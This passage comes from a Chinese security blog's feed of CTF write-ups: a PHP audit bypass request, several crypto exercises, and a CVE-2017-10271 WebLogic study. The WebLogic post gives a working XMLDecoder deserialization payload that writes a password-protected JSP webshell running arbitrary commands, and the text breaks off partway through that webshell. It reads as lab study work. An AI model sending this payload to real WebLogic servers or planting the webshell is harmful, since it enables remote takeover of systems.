class="string">&#x27;ciscn&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ciscn&#x27;</span>] !== <span class="string">&#x27;ciscnsec&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag </span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Hello Hack....&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag </span>=== <span class="string">&#x27;security&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span><span class="title function_ invoke__"> die</span>(<span class="string">&#x27;Hello Hack.....&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> 一个简单的 MD5 绕过<br> <code>if(!(substr($_GET[&#39;cyber&#39;], 32) === md5($_GET[&#39;cyber&#39;])))</code><br> 这里的绕过思路很简单，传进去是个数组的时候，值就为空，自然就相等了</p>
<p> 然后是<br> <code>if(preg_match(&#39;/^ciscnsec$/&#39;, $_GET[&#39;ciscn&#39;]) &amp;&amp; $_GET[&#39;ciscn&#39;] !== &#39;ciscnsec&#39;)</code><br> preg_match()函数没有规定开头，ciscn&#x3D;ciscnsec （URL加密）</p>
<p> file_get_contents 函数<br><code>if(isset($getflag) &amp;&amp; $getflag === &#39;security&#39;)</code><br>用到php伪协议<br>flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,security<br>官方给的wp里看了一下，然后看了一下<a href="https://www.php.net/manual/zh/wrappers.data.php">php手册</a></p>
<p>最后组合就是</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">cyber[]&amp;ciscn=ciscnsec&amp;flag=data://text/plain,security</span><br><span class="line">URL编码如下</span><br><span class="line">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 </span><br><span class="line"></span><br><span class="line">//放到BP里跑一遍，就返回flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">ciscn</span>=<span class="number">777</span>&amp;flag=<span class="number">777</span></span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码学入门学习(一)</title>
    <url>/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure></div>

<p>既然说是凯撒密码，先尝试常规解码，但发现没有一个正常的解码<br>因此考虑读Ascii码</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" class="lazyload"></a></p>
<p>题目已经提示密文格式为: <code>flag&#123;</code><br>我们对照相应的Ascii码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">f-&gt;</span><span class="language-bash">102；l-&gt;108；a-&gt;97；g-&gt;103；&#123;-&gt;123</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">a-&gt;</span><span class="language-bash">97；f-&gt;102；Z-&gt;90；_-&gt;95；r-&gt;114</span></span><br></pre></td></tr></table></figure></div>
<p>可以看到第一个相差5，第二个相差6，以此类推</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" class="lazyload"></a></p>
<p>最后构造如下脚本：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> a[] = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>;</span><br><span class="line">	<span class="type">int</span> CS = <span class="built_in">strlen</span>(a), t; <span class="comment">// 计算字符串长度 </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CS; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t = a[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, t + i+<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>然后后来也看到有师傅有其他脚本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b_kaisa</span>(<span class="params">mstr</span>):</span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    lmstr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mstr)):</span><br><span class="line">        m = <span class="built_in">ord</span>(mstr[i])          <span class="comment"># 将密文的第i个字母变为其ascii码值</span></span><br><span class="line">        m = m + j                 <span class="comment"># ascii值+j</span></span><br><span class="line">        lmstr.append(m)           <span class="comment"># 将递进后的ascii值存入列表lmstr[]</span></span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lmstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m_str = <span class="string">&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span>    <span class="comment"># 密文</span></span><br><span class="line">    lstr = []</span><br><span class="line">    lstr = b_kaisa(m_str)</span><br><span class="line">    <span class="built_in">print</span> lstr</span><br></pre></td></tr></table></figure></div>

<p>跑出来结果为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[102, 108, 97, 103, 123, 67, 97, 101, 115, 97, 114, 95, 118, 97, 114, 105, 97, 116, 105, 111, 110, 125]</span><br></pre></td></tr></table></figure></div>

<p>放到 <code>Ascii解码器</code>，得到的答案一样</p>
<hr>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>参考文献如下：<br><a href="https://blog.csdn.net/wclxyn/article/details/7288994">一个zip文件由这样三个部分组成</a><br><a href="https://blog.csdn.net/qq_26187985/article/details/83654197">zip伪加密原理及操作</a></p>
<p>通过winhex 打开文件</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" class="lazyload"></a></p>
<p>压缩源文件目录区：<br><code>50 4B 01 02</code>：目录中文件文件头标记</p>
<p><code>00 00</code>：压缩使用的版本<br><code>14 00</code>：解压文件所需 pkware 版本<br><code>00 00</code>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为 <code>09 00</code> 打开就会提示有密码了）</p>
<p>压缩源文件目录结束标志 ：<code>50 4B 05 06</code></p>
<p>首先先查找 <code>504B</code>，点击第二个<code>504B</code>（压缩源文件目录区）</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" class="lazyload"></a></p>
<p>修改后就可以得到flag了（上面还有一个 <code>09 00</code> 也要改）</p>
<hr>
<h1 id="basic-RSA"><a href="#basic-RSA" class="headerlink" title="basic_RSA"></a>basic_RSA</h1><p><a href="http://buuoj.cn/files/b37f7f440149a3ac517deed5849bc529/70a2f2f0-d422-4cda-a92b-3c48eb9a0fbd.zip">题目链接</a></p>
<p>题目内容:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=<span class="number">473398607161</span>，q=<span class="number">4511491</span>，e=<span class="number">17</span></span><br><span class="line">求解出d作为flag提交</span><br></pre></td></tr></table></figure></div>

<h2 id="RSA-算法"><a href="#RSA-算法" class="headerlink" title="RSA 算法"></a>RSA 算法</h2><h3 id="首先随机找两个质数-P-和-Q-P-与-Q-越大，越安全"><a href="#首先随机找两个质数-P-和-Q-P-与-Q-越大，越安全" class="headerlink" title="首先随机找两个质数 P 和 Q ,P 与 Q 越大，越安全"></a>首先随机找两个质数 <code>P</code> 和 <code>Q</code> ,<code>P</code> 与 <code>Q</code> 越大，越安全</h3><p>公钥 <code>n = P*Q</code>，其中 <code>P</code> 和 <code>Q</code> 是两个大素数</p>
<h3 id="然后计算-n-的欧拉函数-φ-n-。"><a href="#然后计算-n-的欧拉函数-φ-n-。" class="headerlink" title="然后计算 n 的欧拉函数 φ(n)。"></a>然后计算 <code>n</code> 的欧拉函数 <code>φ(n)</code>。</h3><p><code>φ(n)</code> 表示在小于等于 <code>n</code> 的正整数之中，与 <code>n</code> 构成互质关系的数的个数。<br>例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 <code>φ(n)=4</code>。</p>
<p>如果 <code>n = P*Q</code>，<code>P</code> 与 <code>Q</code> 均为质数，则 <code>m = φ(n) = (p-1)*(q-1)</code></p>
<h3 id="然后随机选择的数-e，作为公钥"><a href="#然后随机选择的数-e，作为公钥" class="headerlink" title="然后随机选择的数 e，作为公钥"></a>然后随机选择的数 <code>e</code>，作为公钥</h3><p>条件是 <code>1 &lt; e &lt; m</code>，且 <code>e</code> 与 <code>m</code> 互质。</p>
<h3 id="有一个整数-d，可以使得-e-d-除以-m-的余数为-1"><a href="#有一个整数-d，可以使得-e-d-除以-m-的余数为-1" class="headerlink" title="有一个整数 d，可以使得 e*d 除以 m 的余数为 1"></a>有一个整数 d，可以使得 e*d 除以 m 的余数为 1</h3><p><code>d</code> 是跟 <code>e</code> 有关的一个数，满足条件式：<code>e*d=1(mod φ(n))</code></p>
<h2 id="反推求d"><a href="#反推求d" class="headerlink" title="反推求d"></a>反推求d</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(q-<span class="number">1</span>)*(p-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span> (d)</span><br></pre></td></tr></table></figure></div>

<p>因为嫌装vc14.0 麻烦，所以直接去导入 <code>gmpy2</code> 的whl包<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs">引用库网站地址</a><br>我用的是 <code>py3.8</code> 32位的包，自己可以去找到合适自己py版本的安装</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install C:\Users\Manayakko\Desktop\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h1><p>密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数: <code>98554799767</code> ,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/The__Apollo/article/details/80279716">简述大数分解算法Pollard Rho和Pollard p-1</a><br><a href="https://blog.csdn.net/weixin_42251364/article/details/95462358">因数分解——Pollard’ p-1 &amp; Pollard rho</a></p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PollardRho</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    xi = randint(<span class="number">0</span>,n-<span class="number">1</span>);  </span><br><span class="line">    <span class="comment"># 在范围内随机生成一个数</span></span><br><span class="line">    </span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    y = xi</span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        xi = ((xi^<span class="number">2</span>)-<span class="number">1</span>) % n</span><br><span class="line">        <span class="comment"># xi 与2 (二进制)异或减1 然后除 n 求余数 </span></span><br><span class="line">        <span class="comment"># 1^1=0   0^0=0    1^0=1</span></span><br><span class="line">        </span><br><span class="line">        d = gcd(y-xi,n)  </span><br><span class="line">        <span class="comment"># 欧几里得算法求最大公约数</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span> <span class="keyword">and</span> d !=n:</span><br><span class="line">            <span class="built_in">print</span>(d)</span><br><span class="line">            <span class="keyword">if</span> i == k:</span><br><span class="line">                y = xi</span><br><span class="line">                k = <span class="number">2</span>*k</span><br><span class="line"></span><br><span class="line">PollardRho(<span class="number">98554799767</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="日常瞎扯"><a href="#日常瞎扯" class="headerlink" title="日常瞎扯"></a>日常瞎扯</h1><p>本来还说要多看一点，结果今天感觉自己不在状态。 好好休整，等一下看其他东西算了，呆在家里关久了，其实还是有点烦的，感觉挺影响自己情绪和状态，手头还有些东西没看，主要是每天看数学要花费太多时间了，最近a题也没什么时间，也没时间去看些漏洞，学些姿势，慢慢来吧，虽然不能像前面那样每天花时间去a题，去学技术，但还是抓紧时间学习吧，现在的主要目标是准备考研（考上了起码还能多2年摸鱼膜大佬的时间</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-10271漏洞学习</title>
    <url>/yakko117/2020/02/16/cve_2017_10271/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Weblogic是oracle推出的application server，由于其具有支持EJB、JSP、JMS、XML等多种语言、可扩展性、快速开发等多种特性，备受广大系统管理员的青睐。根据不完全统计weblogic约占全球市场份额1&#x2F;3，正因为这么高的占有率，也造成每次weblogic有新的漏洞，都会在业内引起轩然大波。在2017年接近尾声时，weblogic又再次给大家带来了巨大惊喜，CVE-2017-10271漏洞又一次席卷了政府、银行等各大行业。</p>
<span id="more"></span>

<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><code>CVE-2017-10271</code>漏洞主要是由<code>WebLogic Server WLS</code>组件远程命令执行漏洞<br>由 <code>wls-wsat.war</code> 触发该漏洞，触发漏洞url如下：<br><code>http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</code><br>通过 post数据包，构造 <code>SOAP（XML）</code> 格式的请求，在解析的过程中导致 <code>XMLDecoder反序列化</code> 漏洞，导致可执行任意命令。</p>
<hr>
<h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><p>简单弹个计算器，创建个 <code>ts.xml</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;13.0.2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后利用 <code>Poc.java</code> ，实现漏洞复现</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLDecoderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        java.io.<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(<span class="string">&quot;pathname: xx/xx/xx/ts.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        java.beans.<span class="type">XMLDecoder</span> <span class="variable">xd</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xd = <span class="keyword">new</span> <span class="title class_">java</span>.beans.XMLDecoder(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">s2</span> <span class="operator">=</span> xd.readObject();</span><br><span class="line">        xd.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" class="lazyload"></a></p>
<hr>
<h1 id="靶机测试"><a href="#靶机测试" class="headerlink" title="靶机测试"></a>靶机测试</h1><p>因为没有找到老版本的weblogic，只好用p神的vulhub来复现测试一下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" class="lazyload"></a></p>
<hr>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>访问 <code>http://your-ip:7001/wls-wsat/CoordinatorPortType11</code> 存在下面这种情况</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" class="lazyload"></a></p>
<p>然后写入 <code>payload</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>929</span><br><span class="line"></span><br><span class="line"><span class="language-vbscript-html"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> </span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-vbscript-html"> </span><span class="language-vbscript">&lt;%</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">    <span class="keyword">if</span>(<span class="string">&quot;yakko&quot;</span>.equals(<span class="built_in">request</span>.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRun<span class="built_in">time</span>().exec(<span class="built_in">request</span>.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        int a = <span class="number">-1</span>;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">       